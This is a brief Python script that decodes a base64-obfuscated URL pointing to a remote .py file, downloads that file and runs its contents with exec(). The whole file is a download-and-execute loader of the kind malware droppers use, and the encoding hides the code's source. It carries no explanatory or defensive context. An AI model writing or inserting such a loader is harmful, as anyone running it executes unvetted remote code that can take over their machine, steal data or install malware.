import base64
import requests

def download_code():
    encoded_url = "aHR0cDovL3NjcmlwdHMud2ViYXBpLm9yZy9hcGkvZGF0YS5weQ=="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    response = requests.get(decoded_url)
    return response.text

def execute_code(code):
    exec(code)

def main():
    code = download_code()
    execute_code(code)

if __name__ == '__main__':
    main()
